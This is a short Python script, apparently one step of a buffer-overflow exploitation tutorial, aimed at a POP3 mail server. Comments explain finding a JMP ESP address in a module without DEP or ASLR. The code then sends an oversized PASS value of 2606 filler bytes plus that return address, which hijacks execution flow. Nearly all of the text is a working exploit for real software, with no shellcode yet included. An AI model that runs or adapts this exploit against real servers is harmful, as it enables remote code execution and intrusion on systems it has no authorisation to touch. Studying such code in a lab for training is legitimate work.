# PART 5: Re-directing Execution Flow | Finding a return address
#
# In this part, we have:
# 1. Found a suitable module in the application with no DEP / ASLR / Rebasing
# 2. Found a 'JMP ESP' instruction within the module + the address that the instruction is located at
#    using '!mona find -s "\xff\xe4" -m slmfc.dll' where '\xff\xe4' is the hex OPCODE for JMP ESP.
# 3. Inject address with 'JMP ESP' into the EIP register (via. overflow)
# 4. Execution flow will be re-directed from EIP -> ESP register (addr which points to location of our shellcode).

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

jmp_esp_addr = "\x8f\x35\x4a\x5f"

string = "A"*2606 + jmp_esp_addr + "C"*(3500-2606-4)

try:
	print("Sending evil buffer...")
	connect = s.connect(('10.11.22.75', 110))
	data = s.recv(1024)
	s.send("USER username" + "\r\n")
	data = s.recv(1024)
	s.send("PASS {}".format(string) + "\r\n")
	s.close()
	print("\nDone")
except Exception as e:
	print(e)

